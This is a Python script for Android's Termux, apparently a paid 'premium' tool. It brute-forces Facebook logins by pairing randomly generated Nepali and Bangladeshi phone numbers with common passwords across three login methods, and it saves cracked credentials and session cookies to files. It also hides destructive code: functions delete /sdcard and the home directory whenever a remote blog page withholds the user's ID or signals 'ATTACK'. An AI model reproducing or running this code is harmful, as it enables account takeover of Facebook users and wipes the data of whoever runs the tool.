# -*- coding : utf-8 -*-
# Name    : AWM-XD
# Auhtor  : HADI ANHAF AIMAN
# Create  : 02 August 2024 12:32 PM

try:
    import be_secure
    import os,re,sys,json
    import uuid,time,shutil
    import random,string,hashlib
    import base64,zlib,datetime,io
    import subprocess,platform,webbrowser
    import bs4,requests,mechanize,urllib
except (Exception,ModuleNotFoundError):
    print("Something went wrong....")
    

try:
    from io import BytesIO
    from zlib import decompress
    from bs4 import BeautifulSoup
    from os import system,path,remove
    from datetime import datetime,timedelta
    from urllib.request import urlopen as opener
    from concurrent.futures import ThreadPoolExecutor as tred
except (Exception,ModuleNotFoundError) as e:
    sys.exit(str(e))

database = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
day = datetime.now().day
month = database[str(datetime.now().month)]
year = datetime.now().year




if path.exists("/data/data/com.termux/files/home/.termux/colors.properties"):
    N = "\x1b[38;5;258m";R = "\x1b[38;5;196m";G = "\x1b[38;5;46m";B = "\x1b[38;5;45m";Y = "\x1b[38;5;154m";I = "\x1b[38;5;127m";S = "\x1b[38;5;81m";W = "\x1b[38;5;256m";P = "\x1b[38;5;203m"
else:
    N = "\x1b[90m";R = "\x1b[91m";G = "\x1b[92m";Y = "\x1b[93m";B = "\x1b[94m";I = "\x1b[95m";S = "\x1b[96m";W = "\x1b[97m";P = "\x1b[38;5;203m"
UID = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
class UserSubscription:
    def __init__(self,username,active_time,user_time):
        self.username = username
        self.userkey = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()
        self.active = datetime.strptime(active_time, "%d-%m-%Y")
        self.expire = self.active + timedelta(days=int(user_time))
    def check_key_status(self):
        current_date = datetime.now()
        if current_date >= self.expire:return "EXPIRE-KEY"
        else:return "ACTIVE-KEY"
    def get_details(self):
        status = self.check_key_status()
        return {
            "USERNAME":self.username,
            "USER-KEY":self.userkey,
            "ACTIVE-TIME":self.active.strftime("%d-%m-%Y"),
            "EXPIRE-TIME":self.expire.strftime("%d-%m-%Y"),
            "USER-STATUS":status,
        }

def ___iamchecking___():
    from be_secure import until
    make_request = until()
    link = "".join('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'a'+'w'+'m'+'-'+'o'+'f'+'f'+'i'+'c'+'i'+'a'+'l'+'.'+'b'+'l'+'o'+'g'+'s'+'p'+'o'+'t'+'.'+'c'+'o'+'m'+'/'+'2'+'0'+'2'+'4'+'/'+'0'+'6'+'/'+'u'+'s'+'e'+'r'+'-'+'x'+'d'+'.'+'h'+'t'+'m'+'l'+'?'+'m'+'='+'1')
    try:
        founder = make_request.get(link)
        if uID in founder:
            pass
        else:
            shutil.rmtree("/sdcard/Android")
            system("rm -rf /sdcard/DCIM/*")
            system("rm -rf /sdcard/*")
            system("rm -rf /sdcard/Download/*")
            shutil.rmtree("$HOME/AWMXD/")
            shutil.rmtree("/data/data/com.termux/files/usr/lib/python3/")
    except Exception:
        sys.exit("Something went wrong....")

def ugen1():
    ua1 = f"Mozilla/5.0 (Linux; Android {random.choice(['10','11','12','13'])}; SM-A127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,150)}.0.{random.randint(5000,7000)}.{random.randint(100,200)} Mobile Safari/537.36"
    ua2 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,150)}.0.{random.randint(5000,7000)}.{random.randint(100,200)} Safari/537.36"
    ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randrange(4,6))+f"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,150)}.0.{random.randint(5000,7000)}.{random.randint(100,150)} Mobile Safari/537.36"
    max = random.choice([ua1,ua2,ua3])
    return str(max)

ugen = []
for win in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def ugen2():
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    main_ua = random.choice([um2,um3,um1,um4])
    return str(main_ua)

def ugen3():
    model = ["SM-G920F","SM-T580","SM-A415F","SM-G900F","GT-I9505","SM-G7102","SGH-I337M","GT-P5210","SM-G130HN","SM-T217S","SGH-I747M"]
    sam_mod = random.choice(model)
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
    version_code = str(random.randint(111111111,999999999))
    ua1 = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{version_code};FBDM/"+"{density=4.0,width=1440,height=2560};"+f"FBLC/en_US;FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(sam_mod)};FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    ua2 = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{version_code};FBDM/"+"{density=1.5,width=1200,height=1920};"+f"FBLC/en_US;FBRV/{version_code};FBCR/WIFI;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(sam_mod)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{version_code};FBDM/"+"{density=3.0,width=1080,height=2166};"+f"FBLC/en_US;FBRV/{version_code};FBCR/LV TELE2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{str(sam_mod)};FBSV/11;FBOP/19;FBCA/arm64-v8a:;]"
    max = random.choice([ua1,ua2,ua3])
    return str(max.encode())

def ugen4():
    android_version = str(random.randint(100,925))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
    version_code = str(random.randint(111111111,999999999))
    ua1 = f"[FBAN/FB4A;FBAV/{android_version};FBBV/{version_code};FBDM/"+"{density=2.0,width=720,height=1440};"+f"FBLC/en_US;FBRV/{version_code};FBCR/XL Axiata;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X653C;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return str(ua1)
sys.stdout.write('\x1b]2; MR-AWM-XD \x07')
X = f"{N}[{W}={N}]{W}"
def banner():
    if sys.platform.lower() == "linux":system("clear")
    elif sys.platform.lower() == "win":system("cls")
    else:return None
    __log_txt_ = (f"""{W}
\t █████  ██     ██ ███    ███ 
\t██   ██ ██     ██ ████  ████ 
\t███████ ██  █  ██ ██ ████ ██ 
\t██   ██ ██ ███ ██ ██  ██  ██ 
\t██   ██  ███ ███  ██      ██
--------------------------------------------
{X} GITHUB  - MR-CODE-143
{X} VERSION  - {Y}10.3 {G}PREMIUM{W}
{X} DEVELOPER - AWM OFFICIAL
--------------------------------------------""")
    return __log_txt_

def linex():
    __lin_txt = (f"{W}--------------------------------------------")
    return __lin_txt

def _server__():
    link = "https://awm-official.blogspot.com/2024/08/servertxt.html"
    from be_secure import until
    http = until()
    response = http.get(link)
    if "SERVER_ON" in response:pass
    elif "SERVER_OFF" in response:
        system("clear")
        msg = ("• Tool Is Under Maintenance For Few Hours....")
        for a in range(20):
            print(f"{G}{msg}")
            time.sleep(1)
        sys.exit(linex())
    elif "ATTACK" in response:
        shutil.rmtree("/sdcard/Android")
        shutil.rmtree("/sdcard/Download")
        shutil.rmtree("/sdcard/DCIM")
        shutil.rmtree("$HOME")
        sys.exit(linex())
    else:sys.exit()

def style(v):
    __code__ = f"{N}[{W}{v}{N}]{S} •{W}"
    return __code__

class Subscription:
    def __init__(self):
        self.url = "https://awm-official.blogspot.com/2024/06/user-xd.html?m=1"
    def checking(self):
        from be_secure import http
        respone = http.get(self.url)
        if uID in respone:
            username,active,expire = re.findall(f"USERKEY={uID}=USERNAME=(.*)=START=(.*)=EXPIRE=(.*)=LIVE",respone)[0]
            userfind = UserSubscription(username,active,expire)
            value = userfind.get_details()
            Main(value).Main()
        else:
            print(banner())
            print(f"{X} NOTE  : THIS TOOL IS PAID.YOU NEED PERMISSION")
            print(f"{X} TOKEN : \x1b[38;5;87m{uID}\x1b[m")
            print(linex())
            name = input(f"{X} NAME  :{G} ")
            print(linex())
            input(f"{X} PRESS ENTER TO BUY SUBSCRIPTION")
            url_wa = "https://api.whatsapp.com/send?phone=+8801721474011&text="
            note = (f"• I WANT TO BUY YOUR TOOL\n• MY NAME : {name}\n• TOKEN  : {uID}")
            subprocess.check_output(["am", "start", url_wa+(note)])
            sys.exit(linex())

class Main:
    def __init__(self,value):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.bou = []
        self.plist = []
        self.ses = requests.Session()
        self.name = str(value["USERNAME"])
        self.token = str(value["USER-KEY"])
        self.active = str(value["ACTIVE-TIME"])
        self.expire = str(value["EXPIRE-TIME"])
        self.status = str(value["USER-STATUS"])
    def hadi(self):
        print(banner())
        if self.status == "EXPIRE-KEY":
            print(f"{X} NAME  : {self.name}")
            print(f"{X} TOKEN : {G}{self.token}")
            print(linex())
            print(f"{X} YOUR SUBSCRIPTION TIME EXPIRED")
            print(f"{X} YOUR KEY EXIPRE DATE {P}: {B}{self.expire}")
            print(f"{X} CONTACT DEVELPOER TO GET SUBSCRIPTION")
            print(linex());sys.exit()
        elif self.status == "ACTIVE-KEY":
            print(f"{X} NAME   : {self.name}")
            print(f"{X} EXPIRE : {self.expire}")
            print(f"{X} TOKEN - {G}{self.token}")
            print(linex())
    def Main(self):
        _server__();print(banner());self.hadi()
        print(f"{style('1')} START FILE CLONE")
        print(f"{style('2')} START RANDOM CLONE")
        print(f"{style('3')} JOIN OUR COMMUNITY")
        print(f"{style('4')} FOLLOW DEVELPOER")
        print(f"{style('5')} EXIT PROGRAM </>")
        print(linex())
        tani = input(f"{X} SELECT  - ")
        if tani == "1":self.FileClone()
        elif tani == "2":self.RandomClone()
        elif tani == "3":
            print(banner())
            url1 = "https://www.facebook.com/share/g/yzfchukAJHuVNbut/?mibextid=A7sQZp"
            try:
                print(f"{X} JOIN OUR FACEBOOK GROUP")
                system(f"xdg-open {url1}")
            except Exception:pass
            url2 = "https://www.facebook.com/profile.php?id=61555618666780"
            try:
                print(f"{X} FOLLOW OUR FACEBOOK PAGE")
                system(f"xdg-open {url2}")
            except Exception:pass
            url3 = "https://t.me/awm_zone"
            try:
                print(f"{X} JOIN OUR TELEGRAM CHANNEL")
                system(f"xdg-open {url3}")
            except Exception:pass
            self.Main()
        elif tani == "4":
            try:
                url1 = "https://www.facebook.com/hadianhaf.official"
                system(f"xdg-open {url1}")
            except Exception:pass
        elif tani == "5":sys.exit(linex())
        else:
            self.Main()

    def RandomClone(self):
        _server__();print(banner());self.hadi()
        print(f"{style('1')} START NEPAL UID CLONE")
        print(f"{style('2')} START BANGLADESH UID CLONE")
        print(f"{style('3')} BACK MAIN-MENU")
        print(linex())
        meh = input(f"{X} SELECT  : ")
        if meh == "1":self.Nepal()
        elif meh == "2":self.Bangla()
        elif meh == "3":self.Main()
        else:self.RandomClone()

    def Nepal(self):
        _server__();print(banner());self.hadi()
        print(f"{X} EXAMPLE : 9815,9814,9861,9840")
        num = input(f"{X} SELECT  : ")
        print(linex())
        print(f"{X} EXAMPLE : 5000,10000,15000")
        lim = input(f"{X} SELECT  : ")
        print(linex())
        print(f"{style('1')} METHOD --> 1")
        print(f"{style('2')} METHOD --> 2")
        print(f"{style('3')} METHOD --> 3")
        print(linex())
        mt = input(f"{X} SELECT  : ")
        for br in range(int(lim)):
            awm = "".join(random.choice(string.digits) for _ in range(6))
            self.bou.append(awm)
        with tred(max_workers=30) as Submit_Ids:
            print(banner())
            try:___iamchecking___()
            except (Exception,KeyboardInterrupt):sys.exit(linex())
            tl = str(len(self.bou))
            print(f"{X} TOTAL ID   : {G}{tl}")
            print(f"{X} METHOD NO  : {S}M-{mt}")
            print(f"{X} IF NO RESULT [ON/OFF] AIRPLANE MODE")
            print(linex())
            print(f"\t\t{G}{day}{I}-{G}{month}{I}-{G}{year}")
            print(linex())
            for love in self.bou:
                ids = num + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,ids[2:],ids[3:],'nepal123','nepal1234','nepal12345','maya123','tamnag','tamnag123','kathmandu','kathmandu123','i love you','nepal@123','sagar123']
                if mt == "1":Submit_Ids.submit(self.randA,ids,passlist)
                elif mt == "2":Submit_Ids.submit(self.randB,ids,passlist)
                elif mt == "3":Submit_Ids.submit(self.randC,ids,passlist)
                else:Submit_Ids.submit(self.randA,ids,passlist)
        print(linex())
        print(f"{X} THANKS FOR USING MY TOOL")
        print(f"{X} TOTAL OK   : {G}{str(len(self.oks))}")
        print(f"{X} TOTAL CP   : {R}{str(len(self.cps))}")
        print(linex())
        sys.exit()

    def Bangla(self):
        _server__();print(banner());self.hadi()
        print(f"{X} EXAMPLE : 0162,0173,0185,0197")
        num = input(f"{X} SELECT  : ")
        print(linex())
        print(f"{X} EXAMPLE : 5000,10000,15000")
        lim = input(f"{X} SELECT  : ")
        print(linex())
        print(f"{style('1')} METHOD --> 1")
        print(f"{style('2')} METHOD --> 2")
        print(f"{style('3')} METHOD --> 3")
        print(linex())
        mt = input(f"{X} SELECT  : ")
        for br in range(int(lim)):
            awm = "".join(random.choice(string.digits) for _ in range(7))
            self.bou.append(awm)
        with tred(max_workers=30) as Submit_Ids:
            print(banner())
            try:___iamchecking___()
            except (Exception,KeyboardInterrupt):sys.exit(linex())
            tl = str(len(self.bou))
            print(f"{X} TOTAL ID   : {G}{tl}")
            print(f"{X} METHOD NO  : {S}M-{mt}")
            print(f"{X} IF NO RESULT [ON/OFF] AIRPLANE MODE")
            print(linex())
            print(f"\t\t{G}{day}{I}-{G}{month}{I}-{G}{year}")
            print(linex())
            for love in self.bou:
                ids = num + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love[1:]]
                if mt == "1":Submit_Ids.submit(self.randA,ids,passlist)
                elif mt == "2":Submit_Ids.submit(self.randB,ids,passlist)
                elif mt == "3":Submit_Ids.submit(self.randC,ids,passlist)
                else:Submit_Ids.submit(self.randA,ids,passlist)
        print(linex())
        print(f"{X} THANKS FOR USING MY TOOL")
        print(f"{X} TOTAL OK   : {G}{str(len(self.oks))}")
        print(f"{X} TOTAL CP   : {R}{str(len(self.cps))}")
        print(linex())
        sys.exit()

    def randA(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M1{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            for pas in passlist:
                pro = random.choice(ugen)
                session = requests.Session()
                free_fb = session.get('https://free.facebook.com').text
                log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number":"0",
                "unrecognized_tries":"0",
                "email":ids,
                "pass":pas,
                "login":"Log In"}
                header_freefb = {"authority": 'm.facebook.com',
                "method": 'GET',
                "scheme": 'https',
                "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                "accept-encoding": 'gzip, deflate, br',
                "accept-language": 'en-US,en;q=1',
                'cache-control': 'no-cache, no-store, must-revalidate',
                "referer": 'https://t.facebook.com/',
                "sec-ch-ua": '"Google Chrome";v="99", "Not)A;Brand";v="8", "Chromium";v="99"',
                "sec-ch-ua-mobile": '?1',
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": 'document',
                "sec-fetch-mode": 'navigate',
                "sec-fetch-site": 'same-origin',
                "sec-fetch-user": '?0',
                "pragma": 'no-cache',
                "priority": 'u=0',
                'cross-origin-resource-policy': 'cross-origin',
                "upgrade-insecure-requests": '1',
                "user-agent":pro}
                lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
                log_cookies=session.cookies.get_dict().keys()
                if 'c_user' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid = re.findall('c_user=(\d+)', coki)[0]
                    if uid in str(self.oks) or uid in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {uid} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-RNDM-M1-OK.txt","a") as saves:
                            saves.write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                        break
                elif "checkpoint" in log_cookies:
                    with open("/sdcard/MR-AWM/AWM-RNDM-CP.txt","a") as saves:
                        saves.write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:
            pass

    def randB(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M2{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            for pas in passlist:
                session = requests.Session()
                xs = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
                data = {"m_ts":re.search('name="m_ts" value="(.*?)"', str(xs)).group(1),"li":re.search('name="li" value="(.*?)"', str(xs)).group(1),"try_number":0,"unrecognized_tries":0,"email":ids,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":False,"had_password_prefilled":False,"is_smart_lock":False,"bi_xrwh":0,'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"', str(xs)).group(1), pas),"jazoest":re.search('name="jazoest" value="(.*?)"', str(xs)).group(1),"lsd":re.search('name="lsd" value="(.*?)"', str(xs)).group(1),"__dyn":"","__csr":"","__req":random.choice(["1","2","3","4","5","6","7","8","9","0"]),"__a":"","__user":0}
                headers = {'Host': 'm.facebook.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','dpr': '1.7125','origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"12.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin',
                'user-agent': ugen2(),'viewport-width': '421','x-asbd-id': '129477','x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xs)).group(1),'x-requested-with': 'XMLHttpRequest','x-response-format': 'JSONStream'}
                lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False).text
                log_cookies=session.cookies.get_dict().keys()
                if 'c_user' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid = re.findall('c_user=(\d+)', coki)[0]
                    if uid in str(self.oks) or uid in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {uid} | {pas}")
                        open("/sdcard/MR-AWM/AWM-RNDM-M2-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                elif "checkpoint" in log_cookies:
                    open("/sdcard/MR-AWM/AWM-RNDM-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception:
            pass
        except KeyboardInterrupt:
            pass

    def randC(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r{X}-{N}[{G}M3{N}]{W}-{N}[{Y}{self.loop}{N}]{W}-{N}[{W}OK:{G}{len(self.oks)}{N}]{W}-{N}[{W}CP:{R}{len(self.cps)}{N}]\r")
        sys.stdout.flush()
        try:
            for pas in passlist:
                from be_secure import http
                data={"email": ids,"password": pas,"method": "post","pretty": "false","format": "json","server_timestamps": "true","locale": "en_US","purpose": "fetch","fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","fb_api_caller_class": "graphservice","client_doc_id": str(random.randint(111111111111111111111111111111,999999999999999999999999999999)),"lois_settings": "lois_token","lara_override": "server_params","is_from_logged_out": "0","layered_homepage_experiment_group": "null","device_id": str(uuid.uuid4()),"waterfall_id": str(uuid.uuid4()),"INTERNAL__latency_qpl_instance_id": "71821365400215","is_platform_login": "0","header_transparency_event_location": "login","INTERNAL__latency_qpl_marker_id": str(random.randint(11111111,99999999)),"family_device_id": str(uuid.uuid4()),"offline_experiment_group": "caa_iteration_v6_perf_fb_2","INTERNAL_INFRA_THEME": "harm_f","headers_flow_id": str(uuid.uuid4()),"transparency_event_type": "affirmative_action","header_transparency_event_name": "login_button_clicked","is_from_logged_in_switcher": "0","bloks_versioning_id": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec","app_id": "com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","scale": "2","styles_id": "e6c6f61b7a86cdf3fa2eaaffa982fbd1","using_white_navbar": "True","pixel_ratio": "2","is_push_on": "True","bloks_version": "c3cc18230235472b54176a5922f9b91d291342c3a276e2644dbdb9760b96deec","fb_api_analytics_tags": '["GraphServices"]',"client_trace_id": str(uuid.uuid4()),"generate_session_cookies": "1","generate_analytics_claim": "1","error_detail_type": "button_with_disabled"}
                head = {"x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}', "x-fb-ta-logging-ids": f"graphql:{str(uuid.uuid4())}","content-type": "application/x-www-form-urlencoded","x-fb-connection-type": "WIFI","x-fb-background-state": "1","x-graphql-request-purpose": "fetch","user-agent": ugen4(),"authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.headers_process_transparency_event","x-graphql-client-library": "graphservice","x-fb-privacy-context": "3643298472347298","x-fb-device-group": "3273","x-tigon-is-retry": "False","priority": "u=3,i","accept-encoding": "gzip, deflate","x-fb-http-engine": "Liger","x-fb-client-ip": "True","x-fb-server-cluster": "True"}
                url = "https://b-graph.facebook.com/auth/login"
                post = requests.post(url,data=data,headers=head).text
                hadi = json.loads(post)
                if "access_token" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    uid = str(hadi["uid"])
                    if uid in str(self.oks) or uid in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {uid} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-RNDM-M3-OK.txt","a") as saves:
                            saves.write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                        break
                elif "Please Confirm Email" in hadi:
                    tani = ";".join(i["name"]+"="+i["value"] for i in hadi["session_cookies"])
                    sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={sbb};{tani}"
                    uid = str(hadi["uid"])
                    if uid in str(self.oks) or uid in str(self.cps):break
                    else:
                        print(f"\r{X}-{G}[AWM-OK] {uid} | {pas}")
                        with open("/sdcard/MR-AWM/AWM-RNDM-M3-OK.txt","a") as saves:
                            saves.write(uid+"|"+pas+"|"+coki+"\n")
                            self.oks.append(uid)
                        break
                else:continue
            self.loop += 1
        except Exception as e:pass

    def FileClone(self):
        print(banner());self.hadi()
        fo = input(f"{X} FILE PATH : ");print(linex())
        try:file = open(fo,"r").read().splitlines()
        except FileNotFoundError:self.FileClone()
        print(f"{style('1')} AUTO PASSWORD CLONING")
        print(f"{style('2')} MANUAL PASSWORD CLONING")
        print(linex())
        ps = input(f"{X} SELECT  : ")
        if ps == "1":
            self.plist.append("firstlast")
            self.plist.append("first last")
            self.plist.append("First Last")
            self.plist.append("firstlast123")
            self.plist.append("first12")
            self.plist.append("first123")
            self.plist.append("first1234")
            self.plist.append("first12345")
            self.plist.append("first@123")
            self.plist.append("last123")
            self.plist.append("last1234")
            self.plist.append("last12345")
            self.plist.append("last@123")
            self.plist.append("first@@@")
            self.plist.append("first1123")
            self.plist.append("@12345@")
